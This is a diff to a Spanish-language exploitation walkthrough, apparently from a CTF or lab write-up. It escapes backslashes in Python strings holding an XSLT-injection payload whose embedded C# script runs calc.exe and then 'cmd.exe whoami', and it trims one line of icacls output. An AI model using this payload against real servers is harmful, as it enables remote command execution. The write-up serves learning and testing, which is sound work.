@@ -225,15 +225,15 @@ El proceso de explotación se da por la falta de sanitizacion de la variable `ct
 El payload que usa el exploit es este:
 
 ```py
-payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
-xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
-xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
-<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
-{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
- proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \\
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \\
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\\
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \\
+{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\
+ proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\
+ </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\\
  </xsl:template> </xsl:stylesheet> ';
 ```
 
@@ -251,15 +251,15 @@ print(r4.text)
 Ahora si, el payload quedaria:
 
 ```py
-payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
-xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
-xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
-<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
-{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "whoami";\
- proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
- proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
- </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \\
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \\
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\\
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \\
+{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\
+ proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "whoami";\\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\
+ </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\\
  </xsl:template> </xsl:stylesheet> ';
 ```
 
@@ -403,7 +403,6 @@ Si revisamos el `owner` del archivo con el comando `dir /q`, vemos que somos nos
 
 ```powershell
 c:\backup>icacls restore.txt
-restore.txt
 Successfully processed 1 files; Failed processing 0 files
 ```
 
